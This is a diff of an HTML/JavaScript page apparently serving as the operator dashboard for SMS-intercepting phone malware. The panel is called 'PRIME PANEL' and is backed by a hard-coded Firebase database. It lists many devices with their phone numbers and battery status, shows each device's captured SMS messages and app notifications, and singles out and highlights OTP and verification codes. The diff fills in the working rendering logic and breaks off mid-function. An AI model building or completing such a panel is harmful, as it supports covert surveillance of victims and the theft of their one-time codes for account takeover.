@@ -8,292 +8,865 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
-        /* ... (CSS from the previous version, it remains the same) ... */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; background: #0a0e17; color: #e0e0e0; min-height: 100vh; padding: 12px; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        /* ... (rest of the CSS from the previous working version) ... */
-        /* I have included the full CSS in the final answer for clarity. */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0e17;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 12px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: rgba(20, 30, 50, 0.8);
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.08);
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .header-left h1 {
+            font-size: 18px;
+            color: #4fc3f7;
+            font-weight: 700;
+        }
+
+        .header-left .subtitle {
+            font-size: 10px;
+            color: #8899aa;
+            letter-spacing: 1px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .header-right .stats {
+            display: flex;
+            gap: 20px;
+        }
+
+        .header-right .stat-item {
+            text-align: center;
+        }
+
+        .header-right .stat-item .number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4fc3f7;
+        }
+
+        .header-right .stat-item .number.online {
+            color: #4caf50;
+        }
+
+        .header-right .stat-item .label {
+            font-size: 9px;
+            color: #8899aa;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .refresh-btn {
+            background: rgba(79, 195, 247, 0.1);
+            color: #4fc3f7;
+            border: 1px solid rgba(79, 195, 247, 0.2);
+            padding: 5px 14px;
+            border-radius: 6px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .refresh-btn:hover {
+            background: rgba(79, 195, 247, 0.2);
+        }
+
+        .live-badge {
+            font-size: 10px;
+            color: #4caf50;
+            background: rgba(76, 175, 80, 0.15);
+            padding: 2px 10px;
+            border-radius: 12px;
+            border: 1px solid rgba(76, 175, 80, 0.2);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .sim-slots {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .sim-slot {
+            background: rgba(20, 30, 50, 0.6);
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 6px;
+            padding: 6px 14px;
+            min-width: 40px;
+            text-align: center;
+            font-size: 11px;
+            font-weight: 600;
+            color: #8899aa;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .sim-slot:hover {
+            border-color: rgba(79, 195, 247, 0.2);
+            background: rgba(79, 195, 247, 0.05);
+        }
+
+        .sim-slot.active {
+            border-color: #4fc3f7;
+            color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.08);
+        }
+
+        .sim-slot .slot-number {
+            font-size: 9px;
+            color: #556;
+        }
+
+        .main-layout {
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 12px;
+        }
+
+        @media (max-width: 1024px) {
+            .main-layout {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .devices-panel {
+            background: rgba(20, 30, 50, 0.6);
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            padding: 14px;
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .panel-header h2 {
+            font-size: 14px;
+            color: #c8d0d8;
+            font-weight: 500;
+        }
+
+        .panel-header .badge {
+            font-size: 10px;
+            color: #8899aa;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 2px 10px;
+            border-radius: 10px;
+        }
+
+        .search-box {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+
+        .search-box input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 6px;
+            padding: 6px 12px;
+            color: #c8d0d8;
+            font-size: 12px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        .search-box input::placeholder {
+            color: #445;
+        }
+
+        .search-box input:focus {
+            border-color: rgba(79, 195, 247, 0.2);
+        }
+
+        .toggle-group {
+            display: flex;
+            gap: 3px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 6px;
+            padding: 2px;
+        }
+
+        .toggle-group button {
+            background: transparent;
+            border: none;
+            color: #8899aa;
+            padding: 3px 12px;
+            border-radius: 4px;
+            font-size: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .toggle-group button.active {
+            background: rgba(79, 195, 247, 0.12);
+            color: #4fc3f7;
+        }
+
+        .toggle-group button:hover:not(.active) {
+            color: #c8d0d8;
+        }
+
+        .devices-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 6px;
+            max-height: 500px;
+            overflow-y: auto;
+            padding-right: 3px;
+        }
+
+        .devices-grid::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .devices-grid::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 2px;
+        }
+
+        .devices-grid::-webkit-scrollbar-thumb {
+            background: rgba(79, 195, 247, 0.15);
+            border-radius: 2px;
+        }
+
+        .device-card {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 8px;
+            padding: 10px 14px;
+            border: 1px solid rgba(100, 150, 255, 0.04);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .device-card:hover {
+            border-color: rgba(79, 195, 247, 0.1);
+            background: rgba(0, 0, 0, 0.35);
+        }
+
+        .device-card.selected {
+            border-color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.06);
+        }
+
+        .device-card.offline {
+            opacity: 0.4;
+        }
+
+        .device-card .device-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .device-card .device-id {
+            font-family: monospace;
+            font-size: 11px;
+            color: #667;
+        }
+
+        .device-card .device-phone {
+            font-size: 13px;
+            color: #c8d0d8;
+            font-weight: 500;
+        }
+
+        .device-card .device-phone.copyable {
+            cursor: pointer;
+            color: #4fc3f7;
+        }
+
+        .device-card .device-phone.copyable:hover {
+            text-decoration: underline;
+        }
+
+        .device-card .device-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .device-card .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .device-card .status-dot.online {
+            background: #4caf50;
+            box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
+        }
+
+        .device-card .status-dot.offline {
+            background: #444;
+        }
+
+        .device-card .battery {
+            font-size: 11px;
+            color: #667;
+        }
+
+        .device-card .sms-count {
+            font-size: 10px;
+            color: #556;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 1px 8px;
+            border-radius: 10px;
+        }
+
+        .device-card .device-sms-preview {
+            margin-top: 6px;
+            padding-top: 6px;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 11px;
+            color: #667;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .device-card .device-sms-preview .sender {
+            color: #4fc3f7;
+        }
+
+        .inbox-panel {
+            background: rgba(20, 30, 50, 0.6);
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            padding: 14px;
+            display: flex;
+            flex-direction: column;
+            max-height: 600px;
+        }
+
+        .inbox-panel .panel-header {
+            flex-shrink: 0;
+        }
+
+        .inbox-panel .panel-header h2 {
+            font-size: 14px;
+            color: #c8d0d8;
+            font-weight: 500;
+        }
+
+        .inbox-panel .panel-header .device-info {
+            font-size: 11px;
+            color: #667;
+        }
+
+        .inbox-panel .panel-header .device-info strong {
+            color: #c8d0d8;
+        }
+
+        .inbox-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding-right: 3px;
+            margin-top: 6px;
+        }
+
+        .inbox-messages::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .inbox-messages::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 2px;
+        }
+
+        .inbox-messages::-webkit-scrollbar-thumb {
+            background: rgba(79, 195, 247, 0.15);
+            border-radius: 2px;
+        }
+
+        .inbox-message {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 6px;
+            padding: 8px 12px;
+            margin-bottom: 4px;
+            border-left: 2px solid rgba(79, 195, 247, 0.15);
+            animation: slideIn 0.3s ease;
+        }
+
+        .inbox-message .msg-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 3px;
+        }
+
+        .inbox-message .msg-sender {
+            font-size: 11px;
+            font-weight: 600;
+            color: #4fc3f7;
+        }
+
+        .inbox-message .msg-time {
+            font-size: 9px;
+            color: #445;
+        }
+
+        .inbox-message .msg-body {
+            font-size: 12px;
+            color: #c8d0d8;
+            word-break: break-word;
+            line-height: 1.4;
+        }
+
+        .inbox-message .msg-body .highlight {
+            color: #ff9800;
+        }
+
+        .inbox-message .msg-body .otp-code {
+            color: #ff9800;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .inbox-placeholder {
+            text-align: center;
+            color: #556;
+            font-size: 12px;
+            padding: 30px 0;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #556;
+            font-size: 12px;
+        }
+
+        .spinner {
+            border: 2px solid rgba(79, 195, 247, 0.1);
+            border-top: 2px solid #4fc3f7;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 6px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-6px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(20, 30, 50, 0.95);
+            padding: 8px 20px;
+            border-radius: 6px;
+            border: 1px solid rgba(79, 195, 247, 0.15);
+            color: #c8d0d8;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .toast.show {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(10px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        .notification-dot {
+            display: none;
+            width: 8px;
+            height: 8px;
+            background: #ff9800;
+            border-radius: 50%;
+            margin-left: 6px;
+            animation: pulse 1s infinite;
+        }
+
+        .notification-dot.show {
+            display: inline-block;
+        }
+
+        @media (max-width: 768px) {
+            body { padding: 8px; }
+            .header { padding: 10px 14px; flex-direction: column; align-items: stretch; }
+            .header-right { justify-content: space-between; }
+            .main-layout { grid-template-columns: 1fr; }
+            .inbox-panel { max-height: 350px; }
+            .devices-grid { max-height: 300px; }
+            .sim-slots { justify-content: center; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="header-left">
-                <h1>📱 PRIME PANEL</h1>
-                <div class="subtitle">REAL-TIME SMS MONITORING SYSTEM</div>
-            </div>
-            <div class="header-right">
-                <span class="live-badge">● LIVE</span>
-                <div class="stats">
-                    <div class="stat-item">
-                        <div class="number online" id="onlineCount">0</div>
-                        <div class="label">ONLINE</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="number" id="smsCount">0</div>
-                        <div class="label">NEW SMS</div>
-                    </div>
-                </div>
-                <button class="refresh-btn" onclick="manualRefresh()">🔄 Refresh</button>
-            </div>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <div class="header-left">
+            <h1>📱 PRIME PANEL</h1>
+            <div class="subtitle">REAL-TIME SMS MONITORING SYSTEM</div>
         </div>
-
-        <!-- SIM Slots -->
-        <div class="sim-slots" id="simSlots">
-            <div class="sim-slot active"><span class="slot-number">📱</span> S1</div>
-            <div class="sim-slot">S2</div>
-            <div class="sim-slot">S3</div>
-            <div class="sim-slot">S4</div>
-            <div class="sim-slot">S5</div>
-            <div class="sim-slot">S6</div>
-            <div class="sim-slot">S7</div>
-            <div class="sim-slot">S8</div>
-        </div>
-
-        <!-- Main Layout -->
-        <div class="main-layout">
-            <!-- Left: Devices -->
-            <div class="devices-panel">
-                <div class="panel-header">
-                    <h2>📱 All Devices</h2>
-                    <span class="badge" id="deviceCount">0 devices</span>
+        <div class="header-right">
+            <span class="live-badge">● LIVE</span>
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="number online" id="onlineCount">0</div>
+                    <div class="label">ONLINE</div>
                 </div>
-                <div class="search-box">
-                    <input type="text" id="searchInput" placeholder="Search by ID or phone..." oninput="filterDevices()">
-                    <div class="toggle-group">
-                        <button class="active" id="allToggle" onclick="setFilter('all')">All</button>
-                        <button id="onlineToggle" onclick="setFilter('online')">Online</button>
-                    </div>
-                </div>
-                <div class="devices-grid" id="devicesGrid">
-                    <div class="loading">Loading devices...</div>
+                <div class="stat-item">
+                    <div class="number" id="smsCount">0</div>
+                    <div class="label">NEW SMS</div>
                 </div>
             </div>
-
-            <!-- Right: SMS Inbox -->
-            <div class="inbox-panel">
-                <div class="panel-header">
-                    <div>
-                        <h2>📨 SMS Inbox <span class="notification-dot" id="newMsgDot"></span></h2>
-                        <div class="device-info" id="selectedDeviceInfo">Select a device to view messages</div>
-                    </div>
-                    <div class="device-info" id="smsTotalCount" style="font-size:10px;color:#556;"></div>
-                </div>
-                <div class="inbox-messages" id="inboxMessages">
-                    <div class="inbox-placeholder">👈 Select a device from the left</div>
-                </div>
-            </div>
+            <button class="refresh-btn" onclick="manualRefresh()">🔄 Refresh</button>
         </div>
     </div>
 
-    <!-- Toast -->
-    <div class="toast" id="toast"></div>
+    <!-- SIM Slots -->
+    <div class="sim-slots" id="simSlots">
+        <div class="sim-slot active"><span class="slot-number">📱</span> S1</div>
+        <div class="sim-slot">S2</div>
+        <div class="sim-slot">S3</div>
+        <div class="sim-slot">S4</div>
+        <div class="sim-slot">S5</div>
+        <div class="sim-slot">S6</div>
+        <div class="sim-slot">S7</div>
+        <div class="sim-slot">S8</div>
+    </div>
 
-    <script>
-        // ===== FIREBASE CONFIG =====
-        // *** IMPORTANT: VERIFY THIS URL IS EXACTLY CORRECT ***
-        const firebaseConfig = {
-            databaseURL: "https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app"
-        };
+    <!-- Main Layout -->
+    <div class="main-layout">
+        <!-- Left: Devices -->
+        <div class="devices-panel">
+            <div class="panel-header">
+                <h2>📱 All Devices</h2>
+                <span class="badge" id="deviceCount">0 devices</span>
+            </div>
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="Search by ID or phone..." oninput="filterDevices()">
+                <div class="toggle-group">
+                    <button class="active" id="allToggle" onclick="setFilter('all')">All</button>
+                    <button id="onlineToggle" onclick="setFilter('online')">Online</button>
+                </div>
+            </div>
+            <div class="devices-grid" id="devicesGrid">
+                <div class="loading">Loading devices...</div>
+            </div>
+        </div>
 
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        <!-- Right: SMS Inbox -->
+        <div class="inbox-panel">
+            <div class="panel-header">
+                <div>
+                    <h2>📨 SMS Inbox <span class="notification-dot" id="newMsgDot"></span></h2>
+                    <div class="device-info" id="selectedDeviceInfo">Select a device to view messages</div>
+                </div>
+                <div class="device-info" id="smsTotalCount" style="font-size:10px;color:#556;"></div>
+            </div>
+            <div class="inbox-messages" id="inboxMessages">
+                <div class="inbox-placeholder">👈 Select a device from the left</div>
+            </div>
+        </div>
+    </div>
+</div>
 
-        // ===== STATE =====
-        let allUsers = {};
-        let selectedDeviceId = null;
-        let currentFilter = 'all';
-        let searchQuery = '';
-        let isInitialLoad = true;
+<!-- Toast -->
+<div class="toast" id="toast"></div>
 
-        // ===== HELPER FUNCTIONS (Keep them as they were) =====
-        function parseTimestamp(ts) { /* ... */ }
-        function isOnline(userData) { /* ... */ }
-        function getPhoneNumber(userData) { /* ... */ }
-        function getBattery(userData) { /* ... */ }
-        function getSmsCount(userData) { /* ... */ }
-        function getLatestSms(userData) { /* ... */ }
-        function getAllSms(userData) { /* ... */ }
-        function getAllNotifications(userData) { /* ... */ }
-        function escapeHtml(text) { /* ... */ }
-        function showToast(msg) { /* ... */ }
-        function copyToClipboard(text) { /* ... */ }
+<script>
+    // ===== FIREBASE CONFIG =====
+    const firebaseConfig = {
+        databaseURL: "https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
 
-        // ===== CORE RENDER FUNCTIONS =====
-        function renderDevices() {
-            const grid = document.getElementById('devicesGrid');
-            grid.innerHTML = '';
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-            let userIds = Object.keys(allUsers);
+    // ===== STATE =====
+    let allUsers = {};
+    let selectedDeviceId = null;
+    let currentFilter = 'all';
+    let searchQuery = '';
+    let isInitialLoad = true;
+    let deviceListeners = {};
 
-            if (currentFilter === 'online') {
-                userIds = userIds.filter(id => isOnline(allUsers[id]));
+    // ===== TOAST =====
+    function showToast(msg) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.classList.add('show');
+        clearTimeout(toast._timeout);
+        toast._timeout = setTimeout(() => toast.classList.remove('show'), 2000);
+    }
+
+    // ===== COPY =====
+    function copyToClipboard(text) {
+        navigator.clipboard?.writeText(text).then(() => {
+            showToast(`📋 Copied: ${text}`);
+        }).catch(() => {
+            const input = document.createElement('input');
+            input.value = text;
+            document.body.appendChild(input);
+            input.select();
+            document.execCommand('copy');
+            document.body.removeChild(input);
+            showToast(`📋 Copied: ${text}`);
+        });
+    }
+
+    // ===== HELPERS =====
+    function parseTimestamp(ts) {
+        if (!ts) return 'N/A';
+        if (typeof ts === 'number') return new Date(ts).toLocaleString();
+        if (typeof ts === 'string') {
+            const d = new Date(ts);
+            if (!isNaN(d.getTime())) return d.toLocaleString();
+            return ts;
+        }
+        return String(ts);
+    }
+
+    function isOnline(userData) {
+        return userData?.status?.isOnline === true;
+    }
+
+    function getPhoneNumber(userData) {
+        if (userData?.simInfo) {
+            for (const key in userData.simInfo) {
+                const sim = userData.simInfo[key];
+                if (sim.number) return sim.number;
             }
+        }
+        return null;
+    }
 
-            if (searchQuery.trim()) {
-                const query = searchQuery.trim().toLowerCase();
-                userIds = userIds.filter(id => {
-                    const user = allUsers[id];
-                    const phone = getPhoneNumber(user) || '';
-                    return id.toLowerCase().includes(query) || phone.includes(query);
-                });
-            }
+    function getBattery(userData) {
+        return userData?.status?.battery ?? 'N/A';
+    }
 
-            if (userIds.length === 0) {
-                grid.innerHTML = `<div class="loading">${currentFilter === 'online' ? 'No online devices' : 'No devices found'}</div>`;
-                document.getElementById('deviceCount').textContent = '0 devices';
-                return;
-            }
+    function getSmsCount(userData) {
+        return userData?.sms_logs ? Object.keys(userData.sms_logs).length : 0;
+    }
 
-            document.getElementById('deviceCount').textContent = `${userIds.length} devices`;
+    function getLatestSms(userData) {
+        if (!userData?.sms_logs) return null;
+        const entries = Object.entries(userData.sms_logs);
+        if (entries.length === 0) return null;
+        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+        return entries[0][1];
+    }
 
-            userIds.forEach(id => {
+    function getAllSms(userData) {
+        if (!userData?.sms_logs) return [];
+        const entries = Object.entries(userData.sms_logs);
+        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+        return entries.map(e => ({ id: e[0], ...e[1] }));
+    }
+
+    function getAllNotifications(userData) {
+        if (!userData?.notifications) return [];
+        const entries = Object.entries(userData.notifications);
+        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+        return entries.map(e => ({ id: e[0], ...e[1] }));
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+
+    // ===== RENDER FUNCTIONS =====
+    function renderDevices() {
+        const grid = document.getElementById('devicesGrid');
+        grid.innerHTML = '';
+
+        let userIds = Object.keys(allUsers);
+
+        if (currentFilter === 'online') {
+            userIds = userIds.filter(id => isOnline(allUsers[id]));
+        }
+
+        if (searchQuery.trim()) {
+            const query = searchQuery.trim().toLowerCase();
+            userIds = userIds.filter(id => {
                 const user = allUsers[id];
-                const online = isOnline(user);
-                const phone = getPhoneNumber(user);
-                const battery = getBattery(user);
-                const smsCount = getSmsCount(user);
-                const latest = getLatestSms(user);
-                const isSelected = id === selectedDeviceId;
-
-                const card = document.createElement('div');
-                card.className = `device-card ${!online ? 'offline' : ''} ${isSelected ? 'selected' : ''}`;
-                card.dataset.deviceId = id;
-                card.onclick = () => selectDevice(id);
-
-                const displayPhone = phone || 'No number';
-                const isCopyable = phone && phone.length > 0;
-
-                let previewHtml = '';
-                if (latest && latest.message) {
-                    const sender = latest.sender || 'Unknown';
-                    const msg = latest.message.length > 50 ? latest.message.substring(0, 50) + '...' : latest.message;
-                    previewHtml = `
-                        <div class="device-sms-preview">
-                            <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
-                        </div>
-                    `;
-                }
-
-                card.innerHTML = `
-                    <div class="device-row">
-                        <div>
-                            <div class="device-id">${escapeHtml(id.substring(0, 14))}...</div>
-                            <div class="device-phone ${isCopyable ? 'copyable' : ''}" 
-                                 onclick="${isCopyable ? `event.stopPropagation(); copyToClipboard('${phone}')` : ''}">
-                                ${isCopyable ? '📞 ' : ''}${escapeHtml(displayPhone)}
-                            </div>
-                        </div>
-                        <div class="device-status">
-                            <span class="status-dot ${online ? 'online' : 'offline'}"></span>
-                            <span class="battery">🔋 ${battery}%</span>
-                            <span class="sms-count">${smsCount}</span>
-                        </div>
-                    </div>
-                    ${previewHtml}
-                `;
-
-                grid.appendChild(card);
+                const phone = getPhoneNumber(user) || '';
+                return id.toLowerCase().includes(query) || phone.includes(query);
             });
-
-            if (!selectedDeviceId && userIds.length > 0) {
-                selectDevice(userIds[0]);
-            }
         }
 
-        function selectDevice(deviceId) {
-            if (selectedDeviceId === deviceId) return;
-            selectedDeviceId = deviceId;
-            renderDevices();
-            renderInbox();
-            document.getElementById('newMsgDot').classList.remove('show');
+        if (userIds.length === 0) {
+            grid.innerHTML = `<div class="loading">${currentFilter === 'online' ? 'No online devices' : 'No devices found'}</div>`;
+            document.getElementById('deviceCount').textContent = '0 devices';
+            return;
         }
 
-        function renderInbox(newMessageId = null) {
-            // ... (This function is exactly as provided in the previous correct version) ...
-            const container = document.getElementById('inboxMessages');
-            const info = document.getElementById('selectedDeviceInfo');
-            const totalCount = document.getElementById('smsTotalCount');
+        document.getElementById('deviceCount').textContent = `${userIds.length} devices`;
 
-            if (!selectedDeviceId || !allUsers[selectedDeviceId]) {
-                container.innerHTML = '<div class="inbox-placeholder">👈 Select a device from the left</div>';
-                info.textContent = 'Select a device to view messages';
-                totalCount.textContent = '';
-                return;
-            }
-
-            const user = allUsers[selectedDeviceId];
-            const phone = getPhoneNumber(user) || 'No number';
+        userIds.forEach(id => {
+            const user = allUsers[id];
+            const online = isOnline(user);
+            const phone = getPhoneNumber(user);
             const battery = getBattery(user);
-            const smsList = getAllSms(user);
-            const notifList = getAllNotifications(user);
+            const smsCount = getSmsCount(user);
+            const latest = getLatestSms(user);
+            const isSelected = id === selectedDeviceId;
 
-            info.innerHTML = `<strong>${escapeHtml(selectedDeviceId.substring(0, 12))}...</strong> · 📞 ${escapeHtml(phone)} · 🔋 ${battery}%`;
-            totalCount.textContent = `${smsList.length + notifList.length} messages`;
+            const card = document.createElement('div');
+            card.className = `device-card ${!online ? 'offline' : ''} ${isSelected ? 'selected' : ''}`;
+            card.dataset.deviceId = id;
+            card.onclick = () => selectDevice(id);
 
-            if (smsList.length === 0 && notifList.length === 0) {
-                container.innerHTML = '<div class="inbox-placeholder">📭 No messages for this device</div>';
-                return;
-            }
+            const displayPhone = phone || 'No number';
+            const isCopyable = phone && phone.length > 0;
 
-            if (newMessageId) {
-                const newSms = smsList.find(s => s.id === newMessageId);
-                if (newSms) {
-                    const div = document.createElement('div');
-                    div.className = 'inbox-message new-message';
-                    const sender = newSms.sender || 'Unknown';
-                    const isOTP = /otp|code|verification/i.test(newSms.message);
-                    let bodyHtml = escapeHtml(newSms.message || '');
-                    
-                    if (isOTP) {
-                        const otpMatch = newSms.message.match(/\b\d{4,6}\b/);
-                        if (otpMatch) {
-                            bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
-                        }
-                    }
-
-                    div.innerHTML = `
-                        <div class="msg-header">
-                            <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
-                            <span class="msg-time">${parseTimestamp(newSms.timestamp)}</span>
-                        </div>
-                        <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
-                    `;
-                    
-                    container.prepend(div);
-                    container.scrollTop = 0;
-                    document.getElementById('newMsgDot').classList.add('show');
-                    updateDeviceCardSmsCount(selectedDeviceId);
-                    updateStats();
-                    return;
-                }
-            }
-
-            container.innerHTML = '';
-            notifList.forEach(notif => {
-                const div = document.createElement('div');
-                div.className = 'inbox-message';
-                div.innerHTML = `
-                    <div class="msg-header">
-                        <span class="msg-sender">🔔 ${escapeHtml(notif.app || 'Notification')}</span>
-                        <span class="msg-time">${parseTimestamp(notif.timestamp)}</span>
+            let previewHtml = '';
+            if (latest && latest.message) {
+                const sender = latest.sender || 'Unknown';
+                const msg = latest.message.length > 50 ? latest.message.substring(0, 50) + '...' : latest.message;
+                previewHtml = `
+                    <div class="device-sms-preview">
+                        <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
                     </div>
-                    <div class="msg-body"><strong>${escapeHtml(notif.title || '')}</strong><br>${escapeHtml(notif.message || '')}</div>
                 `;
-                container.appendChild(div);
-            });
+            }
 
-            smsList.forEach(sms => {
+            card.innerHTML = `
+                <div class="device-row">
+                    <div>
+                        <div class="device-id">${escapeHtml(id.substring(0, 14))}...</div>
+                        <div class="device-phone ${isCopyable ? 'copyable' : ''}" 
+                             onclick="${isCopyable ? `event.stopPropagation(); copyToClipboard('${phone}')` : ''}">
+                            ${isCopyable ? '📞 ' : ''}${escapeHtml(displayPhone)}
+                        </div>
+                    </div>
+                    <div class="device-status">
+                        <span class="status-dot ${online ? 'online' : 'offline'}"></span>
+                        <span class="battery">🔋 ${battery}%</span>
+                        <span class="sms-count">${smsCount}</span>
+                    </div>
+                </div>
+                ${previewHtml}
+            `;
+
+            grid.appendChild(card);
+        });
+
+        // Auto-select first if none selected
+        if (!selectedDeviceId && userIds.length > 0) {
+            selectDevice(userIds[0]);
+        }
+    }
+
+    function selectDevice(deviceId) {
+        if (selectedDeviceId === deviceId) return;
+        selectedDeviceId = deviceId;
+        renderDevices();
+        // Force refresh inbox with latest data
+        renderInbox();
+        document.getElementById('newMsgDot').classList.remove('show');
+    }
+
+    // ===== RENDER INBOX =====
+    function renderInbox(newMessageId = null) {
+        const container = document.getElementById('inboxMessages');
+        const info = document.getElementById('selectedDeviceInfo');
+        const totalCount = document.getElementById('smsTotalCount');
+
+        if (!selectedDeviceId || !allUsers[selectedDeviceId]) {
+            container.innerHTML = '<div class="inbox-placeholder">👈 Select a device from the left</div>';
+            info.textContent = 'Select a device to view messages';
+            totalCount.textContent = '';
+            return;
+        }
+
+        // Get the LATEST data directly from allUsers
+        const user = allUsers[selectedDeviceId];
+        const phone = getPhoneNumber(user) || 'No number';
+        const battery = getBattery(user);
+        const smsList = getAllSms(user);
+        const notifList = getAllNotifications(user);
+
+        info.innerHTML = `<strong>${escapeHtml(selectedDeviceId.substring(0, 12))}...</strong> · 📞 ${escapeHtml(phone)} · 🔋 ${battery}%`;
+        totalCount.textContent = `${smsList.length + notifList.length} messages`;
+
+        if (smsList.length === 0 && notifList.length === 0) {
+            container.innerHTML = '<div class="inbox-placeholder">📭 No messages for this device</div>';
+            return;
+        }
+
+        // If new message ID is provided and it's for the selected device
+        if (newMessageId) {
+            const newSms = smsList.find(s => s.id === newMessageId);
+            if (newSms) {
+                // Prepend the new message
                 const div = document.createElement('div');
-                div.className = 'inbox-message';
-                const sender = sms.sender || 'Unknown';
-                const isOTP = /otp|code|verification/i.test(sms.message);
-                let bodyHtml = escapeHtml(sms.message || '');
+                div.className = 'inbox-message new-message';
+                const sender = newSms.sender || 'Unknown';
+                const isOTP = /otp|code|verification/i.test(newSms.message);
+                let bodyHtml = escapeHtml(newSms.message || '');
                 
                 if (isOTP) {
-                    const otpMatch = sms.message.match(/\b\d{4,6}\b/);
+                    const otpMatch = newSms.message.match(/\b\d{4,6}\b/);
                     if (otpMatch) {
                         bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
                     }
@@ -302,95 +875,222 @@
                 div.innerHTML = `
                     <div class="msg-header">
                         <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
